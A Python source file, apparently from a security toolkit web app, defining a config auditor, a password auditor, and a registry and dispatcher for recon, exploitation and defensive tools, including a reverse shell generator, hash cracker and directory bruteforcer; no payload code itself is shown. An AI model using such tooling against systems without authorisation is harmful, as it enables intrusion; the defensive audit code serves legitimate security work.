    """Audit configuration snippets for common security misconfigurations."""

    CHECKS = {
        "ssh": [
            {"pattern": r"PermitRootLogin\s+yes", "severity": "high",
             "finding": "SSH root login enabled", "fix": "Set PermitRootLogin no"},
            {"pattern": r"PasswordAuthentication\s+yes", "severity": "medium",
             "finding": "SSH password authentication enabled", "fix": "Set PasswordAuthentication no, use SSH keys"},
            {"pattern": r"PermitEmptyPasswords\s+yes", "severity": "critical",
             "finding": "SSH empty passwords allowed", "fix": "Set PermitEmptyPasswords no"},
            {"pattern": r"Protocol\s+1", "severity": "critical",
             "finding": "SSHv1 protocol enabled", "fix": "Set Protocol 2"},
            {"pattern": r"X11Forwarding\s+yes", "severity": "low",
             "finding": "X11 forwarding enabled", "fix": "Set X11Forwarding no unless required"},
        ],
        "nginx": [
            {"pattern": r"server_tokens\s+on", "severity": "low",
             "finding": "Nginx version disclosure enabled", "fix": "Set server_tokens off"},
            {"pattern": r"autoindex\s+on", "severity": "medium",
             "finding": "Directory listing enabled", "fix": "Set autoindex off"},
            {"pattern": r"ssl_protocols.*TLSv1[^.]", "severity": "high",
             "finding": "Weak TLS versions enabled (TLSv1.0/1.1)", "fix": "Use ssl_protocols TLSv1.2 TLSv1.3"},
        ],
        "apache": [
            {"pattern": r"ServerSignature\s+On", "severity": "low",
             "finding": "Apache server signature enabled", "fix": "Set ServerSignature Off"},
            {"pattern": r"Options.*Indexes", "severity": "medium",
             "finding": "Directory indexing enabled", "fix": "Remove Indexes from Options"},
            {"pattern": r"AllowOverride\s+All", "severity": "low",
             "finding": "AllowOverride All (may be too permissive)", "fix": "Restrict AllowOverride to specific directives"},
        ],
        "general": [
            {"pattern": r"(?i)(password|secret|api_key|token)\s*[=:]\s*['\"]?[^\s'\"]+", "severity": "high",
             "finding": "Hardcoded credential or secret detected", "fix": "Use environment variables or a secrets manager"},
            {"pattern": r"(?i)0\.0\.0\.0", "severity": "medium",
             "finding": "Service binding to all interfaces", "fix": "Bind to specific IP (e.g., 127.0.0.1) where possible"},
            {"pattern": r"(?i)(debug|verbose)\s*[=:]\s*(true|on|1|yes)", "severity": "medium",
             "finding": "Debug/verbose mode enabled", "fix": "Disable debug mode in production"},
        ],
    }

    @classmethod
    def audit(cls, config_text, config_type="auto"):
        """Audit a configuration snippet."""
        results = {
            "status": "completed",
            "config_type": config_type,
            "findings": [],
            "summary": {"critical": 0, "high": 0, "medium": 0, "low": 0},
            "score": 100,
        }

        check_sets = []
        if config_type == "auto":
            check_sets = list(cls.CHECKS.values())
        elif config_type in cls.CHECKS:
            check_sets = [cls.CHECKS[config_type]]
        else:
            check_sets = [cls.CHECKS["general"]]

        for checks in check_sets:
            for check in checks:
                if re.search(check["pattern"], config_text):
                    sev = check["severity"]
                    results["findings"].append({
                        "severity": sev,
                        "finding": check["finding"],
                        "fix": check["fix"],
                    })
                    results["summary"][sev] = results["summary"].get(sev, 0) + 1

        # Score: deduct per severity
        deductions = {"critical": 25, "high": 15, "medium": 8, "low": 3}
        for sev, count in results["summary"].items():
            results["score"] -= deductions.get(sev, 0) * count
        results["score"] = max(0, results["score"])

        return results


class PasswordAuditor:
    """Audit password strength and check against common patterns."""

    COMMON_PASSWORDS = {
        "password", "123456", "12345678", "qwerty", "abc123",
        "monkey", "master", "dragon", "111111", "baseball",
        "iloveyou", "trustno1", "sunshine", "letmein", "welcome",
        "admin", "login", "princess", "starwars", "654321",
        "password1", "admin123", "root", "toor", "pass", "test",
    }

    @classmethod
    def audit(cls, password):
        """Audit a password for strength and common patterns."""
        results = {
            "status": "completed",
            "length": len(password),
            "strength": "weak",
            "score": 0,
            "issues": [],
            "recommendations": [],
        }

        score = 0
        # Length scoring
        if len(password) >= 16:
            score += 30
        elif len(password) >= 12:
            score += 20
        elif len(password) >= 8:
            score += 10
        else:
            results["issues"].append("Password is too short (< 8 characters)")

        # Complexity
        if re.search(r"[A-Z]", password):
            score += 15
        else:
            results["issues"].append("No uppercase letters")
        if re.search(r"[a-z]", password):
            score += 15
        else:
            results["issues"].append("No lowercase letters")
        if re.search(r"\d", password):
            score += 15
        else:
            results["issues"].append("No numbers")
        if re.search(r"[!@#$%^&*(),.?\":{}|<>]", password):
            score += 15
        else:
            results["issues"].append("No special characters")

        # Pattern checks
        if password.lower() in cls.COMMON_PASSWORDS:
            score = max(0, score - 50)
            results["issues"].append("Password is in common passwords list")
        if re.search(r"(.)\1{2,}", password):
            score -= 10
            results["issues"].append("Contains repeated characters")
        if re.search(r"(012|123|234|345|456|567|678|789|abc|bcd|cde)", password.lower()):
            score -= 10
            results["issues"].append("Contains sequential characters")

        results["score"] = max(0, min(100, score))
        if results["score"] >= 80:
            results["strength"] = "strong"
        elif results["score"] >= 50:
            results["strength"] = "moderate"

        if results["strength"] != "strong":
            results["recommendations"] = [
                "Use at least 12 characters, preferably 16+.",
                "Include uppercase, lowercase, numbers, and special characters.",
                "Use a passphrase: random words joined together.",
                "Use a password manager to generate and store unique passwords.",
                "Never reuse passwords across services.",
            ]

        return results


# ── Tool Registry ──────────────────────────────────────────────────────

TOOLS = {
    "port_scanner": {
        "name": "Port Scanner",
        "description": "Multi-threaded TCP port scanner with banner grabbing",
        "icon": "🔌",
        "category": "reconnaissance",
        "params": [
            {"name": "target", "type": "text", "label": "Target (IP/hostname)", "required": True, "placeholder": "e.g. 192.168.1.1 or example.com"},
            {"name": "ports", "type": "text", "label": "Ports", "required": False, "placeholder": "1-1024, 80,443, or top100", "default": "top100"},
        ],
    },
    "network_scanner": {
        "name": "Network Discovery",
        "description": "Discover live hosts on a /24 network via TCP ping",
        "icon": "🌐",
        "category": "reconnaissance",
        "params": [
            {"name": "network", "type": "text", "label": "Network (CIDR /24)", "required": True, "placeholder": "e.g. 192.168.1.0/24"},
        ],
    },
    "subdomain_enum": {
        "name": "Subdomain Enumerator",
        "description": "Discover subdomains via DNS brute-force and certificate transparency",
        "icon": "🔍",
        "category": "reconnaissance",
        "params": [
            {"name": "domain", "type": "text", "label": "Domain", "required": True, "placeholder": "e.g. example.com"},
        ],
    },
    "header_analyzer": {
        "name": "Header Analyzer",
        "description": "Analyze HTTP security headers and score the target",
        "icon": "🛡️",
        "category": "web_security",
        "params": [
            {"name": "url", "type": "text", "label": "Target URL", "required": True, "placeholder": "e.g. https://example.com"},
        ],
    },
    "tech_detector": {
        "name": "Technology Detector",
        "description": "Fingerprint web technologies, frameworks, and server software",
        "icon": "🔬",
        "category": "web_security",
        "params": [
            {"name": "url", "type": "text", "label": "Target URL", "required": True, "placeholder": "e.g. https://example.com"},
        ],
    },
    "dir_bruteforce": {
        "name": "Directory Bruteforcer",
        "description": "Discover hidden directories, files, and backup files",
        "icon": "📂",
        "category": "web_security",
        "params": [
            {"name": "url", "type": "text", "label": "Target URL", "required": True, "placeholder": "e.g. https://example.com"},
            {"name": "extensions", "type": "text", "label": "Extensions (optional)", "required": False, "placeholder": ".php,.html,.bak,.txt"},
        ],
    },
    "hash_cracker": {
        "name": "Hash Cracker",
        "description": "Identify and crack MD5, SHA1, SHA256 hashes with a wordlist",
        "icon": "🔓",
        "category": "exploitation",
        "params": [
            {"name": "hash", "type": "text", "label": "Hash Value", "required": True, "placeholder": "e.g. 5f4dcc3b5aa765d61d8327deb882cf99"},
        ],
    },
    "reverse_shell": {
        "name": "Reverse Shell Generator",
        "description": "Generate reverse shell payloads in multiple languages",
        "icon": "💣",
        "category": "exploitation",
        "params": [
            {"name": "lhost", "type": "text", "label": "Listener IP (LHOST)", "required": True, "placeholder": "e.g. 10.10.14.5"},
            {"name": "lport", "type": "text", "label": "Listener Port (LPORT)", "required": True, "placeholder": "e.g. 4444"},
            {"name": "type", "type": "select", "label": "Shell Type", "required": True,
             "options": ["bash", "python", "php", "nc", "powershell", "perl", "ruby", "java"]},
        ],
    },
    "dns_recon": {
        "name": "DNS Recon",
        "description": "DNS lookup, reverse DNS, and record enumeration",
        "icon": "📡",
        "category": "reconnaissance",
        "params": [
            {"name": "domain", "type": "text", "label": "Domain", "required": True, "placeholder": "e.g. example.com"},
        ],
    },
    "encoder": {
        "name": "Encoder / Decoder",
        "description": "Encode/decode payloads: Base64, URL, Hex, HTML, Hashing",
        "icon": "🔄",
        "category": "utilities",
        "params": [
            {"name": "text", "type": "text", "label": "Input Text", "required": True, "placeholder": "Text to encode/decode"},
            {"name": "operation", "type": "select", "label": "Operation", "required": True,
             "options": ["encode", "decode"]},
            {"name": "encoding", "type": "select", "label": "Encoding Type", "required": True,
             "options": ["base64", "url", "hex", "html", "unicode", "binary", "md5", "sha1", "sha256"]},
        ],
    },
    # ── Blue Team / Defensive Tools ───────────────────────────────────
    "log_analyzer": {
        "name": "Log Analyzer",
        "description": "Analyze logs for suspicious patterns, brute-force, injection & exfil attempts",
        "icon": "📊",
        "category": "defense",
        "params": [
            {"name": "log_text", "type": "textarea", "label": "Log Content", "required": True, "placeholder": "Paste log entries here..."},
            {"name": "log_type", "type": "select", "label": "Log Type", "required": False,
             "options": ["auto", "auth", "access", "syslog", "windows_event"]},
        ],
    },
    "ioc_scanner": {
        "name": "IOC Scanner",
        "description": "Extract IPs, domains, hashes, CVEs and other indicators from text",
        "icon": "🔎",
        "category": "defense",
        "params": [
            {"name": "text", "type": "textarea", "label": "Text to Scan", "required": True, "placeholder": "Paste threat report, log, or alert content..."},
        ],
    },
    "config_auditor": {
        "name": "Config Auditor",
        "description": "Audit SSH, nginx, Apache or general configs for misconfigurations",
        "icon": "⚙️",
        "category": "defense",
        "params": [
            {"name": "config_text", "type": "textarea", "label": "Configuration", "required": True, "placeholder": "Paste configuration content..."},
            {"name": "config_type", "type": "select", "label": "Config Type", "required": False,
             "options": ["auto", "ssh", "nginx", "apache", "general"]},
        ],
    },
    "password_auditor": {
        "name": "Password Auditor",
        "description": "Audit password strength, check patterns and common passwords",
        "icon": "🔑",
        "category": "defense",
        "params": [
            {"name": "password", "type": "text", "label": "Password to Audit", "required": True, "placeholder": "Enter password to check"},
        ],
    },
}


def run_tool(tool_id, params):
    """Execute a security tool and return results."""
    if tool_id == "port_scanner":
        return PortScanner.scan(
            target=params["target"],
            ports=params.get("ports", "top100"),
        )
    elif tool_id == "network_scanner":
        return NetworkScanner.discover(network=params["network"])
    elif tool_id == "subdomain_enum":
        return SubdomainEnumerator.enumerate(domain=params["domain"])
    elif tool_id == "header_analyzer":
        return HeaderAnalyzer.analyze(url=params["url"])
    elif tool_id == "tech_detector":
        return TechDetector.detect(url=params["url"])
    elif tool_id == "dir_bruteforce":
        ext_str = params.get("extensions", "")
        extensions = [e.strip() for e in ext_str.split(",") if e.strip()] if ext_str else None
        return DirBruter.bruteforce(url=params["url"], extensions=extensions)
    elif tool_id == "hash_cracker":
        return HashCracker.crack(hash_str=params["hash"])
    elif tool_id == "reverse_shell":
        return PayloadGenerator.reverse_shell(
            lhost=params["lhost"],
            lport=params["lport"],
            shell_type=params.get("type", "bash"),
        )
    elif tool_id == "dns_recon":
        return DNSRecon.dns_lookup(domain=params["domain"])
    elif tool_id == "encoder":
        operation = params.get("operation", "encode")
        encoding = params.get("encoding", "base64")
        text = params["text"]
        if operation == "encode":
            result = Encoder.encode(text, encoding)
        else:
            result = Encoder.decode(text, encoding)
        return {
            "input": text,
            "operation": operation,
            "encoding": encoding,
            "output": result if result is not None else "Error: Could not process",
            "status": "completed" if result is not None else "error",
        }
    elif tool_id == "log_analyzer":
        return LogAnalyzer.analyze(
            log_text=params["log_text"],
            log_type=params.get("log_type", "auto"),
        )
    elif tool_id == "ioc_scanner":
        return IOCScanner.scan(text=params["text"])
    elif tool_id == "config_auditor":
        return ConfigAuditor.audit(
            config_text=params["config_text"],
            config_type=params.get("config_type", "auto"),
        )
    elif tool_id == "password_auditor":
        return PasswordAuditor.audit(password=params["password"])
    else:
        return {"error": f"Unknown tool: {tool_id}", "status": "error"}
